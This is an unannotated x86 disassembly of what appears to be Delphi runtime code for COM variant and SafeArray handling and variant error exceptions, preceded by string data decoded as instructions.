jbe r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
outsb
je r-xdata
rcr [ esp + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar al 0xe3
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x70795474
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0xc0040 ] dl
popad
jb r-xdata
outsd
insd
push esi
popad
jb r-xdata
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
sbb [ ebp + 0x56 ] al
jb r-xdata
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
inc eax
add [ ecx + esi + 0x40 ] bl
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x7a
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
jecxz r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
jecxz r-xdata
add [ eax ] al
lea eax [ eax ]
xor bl ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jecxz r-xdata
add [ esi ] dl
inc eax
popad
outsb
je r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ch ah
inc eax
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x7a
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax ] bl
inc ebp
push esi
outsd
jb r-xdata
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edi ] dl
add [ eax ] al
add [ edx + edi * 2 ] bh
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x7a
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edi ] dl
in al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
in al 0x40
inc ecx
jb r-xdata
add [ eax ] al
cmp al 0x7a
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ 0x72615645 ] dl
add [ eax + eax ] cl
nop
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x7a
inc eax
xor eax [ eax ]
jns r-xdata
add al al
xor eax [ eax ]
les esi [ ebx ]
jb r-xdata
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
jb r-xdata
ror [ eax + 0x40e5 ] 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ 0x72615645 ] dl
add [ eax ] al
add [ edx + edi * 2 ] bh
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
in eax 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xc0040 ] ah
inc ebp
jb r-xdata
jbe r-xdata
loop r-xdata
add al 0x31
outsd
popad
jb r-xdata
inc eax
add [ esi + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc0040e6
add [ eax ] al
add [ edx + edi * 2 ] bh
popad
outsb
je r-xdata
popad
jb r-xdata
popad
jns r-xdata
add [ eax ] al
cmp al 0x7a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xe5
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
add [ ebx + esi + 0x33c00040 ] dh
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] cl
push esi
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
sbb [ ebp + 0x56 ] al
inc eax
add [ ecx + esi ] al
insd
inc eax
add al cl
xor eax [ eax ]
jb r-xdata
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax ] bl
inc ebp
push esi
add [ eax ] al
jb r-xdata
popad
jb r-xdata
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
sbb [ ebp + 0x56 ] al
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
add [ ecx + esi + 0x40 ] bl
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
xor eax [ eax ]
add al 0x31
inc eax
add [ eax ] ah
xor [ eax ] eax
pop esp
xor [ eax ] eax
pop ss
jne r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax * 2 + 0x69726156 ] dl
inc eax
add [ eax - 0x1a ] bl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1a ] bl
inc eax
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x7a
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
outsd
jb r-xdata
jbe r-xdata
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
mov bh ah
inc eax
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ edi ] ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] ah
inc eax
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x7a
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edi ] dl
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ eax ] bl
inc ebp
push esi
inc eax
add al dh
in eax 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
in eax 0x40
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x7a
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
pop ebp
insb
imul esp [ esi + ecx * 2 + 0x75 ] 0x704f6c6c
inc ebp
dec esi
jne r-xdata
push 0x6f727245
jb r-xdata
retn
popad
outsb
je r-xdata
out 0x40 eax
add [ eax + eax ] cl
add [ eax ] al
in al 0xe2
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] bl
add [ edx ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
outsd
jb r-xdata
outsd
jb r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e7 ] cl
add [ eax ] al
add [ edx + edi * 2 ] bh
inc eax
add [ ebx + esi + 0x33c00040 ] dh
inc eax
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0xc0040 ] bh
add [ eax ] al
cmp al 0x7a
outsd
jmp r-xdata
call 0xffffffff8c2535f9
mov ebx eax
insb
dec edi
jo r-xdata
shr ah 0xe7
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e859
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
outsb
dec edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
out 0x40 eax
add [ eax ] al
add [ eax ] al
outsd
popad
jns r-xdata
xor eax eax
push ebp
push sub_40e8eb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413fb0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413fb0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e8f2
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f64
retn
in al 0x53
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
add [ ebp - 0x101703bb ] cl
push esi
jb r-xdata
sub_40e808
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e852
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e859
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_40e85c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e8eb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413fb0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413fb0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e8f2
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f64
retn
sub_40e8f8
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e942
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e949
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_40e94c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e996
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e99d
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_40e9a0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ea2f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413fb0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413fb0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea36
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f64
retn
sub_40ea3c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ea86
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea8d
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_40ea90
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40ecd5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ecdc
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403f64
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403f64
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
dec eax
je r-xdata
call sub_40e808
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
jmp r-xdata
call sub_40e8f8
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40b1c4
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba08
call sub_4038f8
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
jmp r-xdata
sub_40ecf0
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e85c
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e9a0
jmp r-xdata
jmp r-xdata
call sub_40ea90
sub_40ed24
push ebx
push esi
mov esi edx
mov ebx eax
call sub_40276c
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
call sub_40276c
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40ecf0
pop esi
pop ebx
retn
call sub_40276c
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40ecf0
jmp r-xdata
call sub_4027ac
mov edx eax
mov eax edx
call sub_4038f8
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40ecf0
jmp r-xdata
pop esi
pop ebx
retn
sub_40eda8
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40edf2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40edf9
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_40ee10
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ee40
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ee40
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ee9c
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ece4
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40ece4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ee10
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40ece4
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40ece4
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40ee40
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ece4
mov eax [ ebp - 0x314 ]
call sub_40f094
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40f018
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40ece4
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403f40
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_414478
test al al
je r-xdata
mov eax ebx
call sub_40ee9c
jmp r-xdata
push ebx
call VariantClear
call sub_40ece4
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40f0b0
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40f0e0
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40f0e0
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f13c
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ece4
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40ece4
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40f094
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40ea3c
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40ece4
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
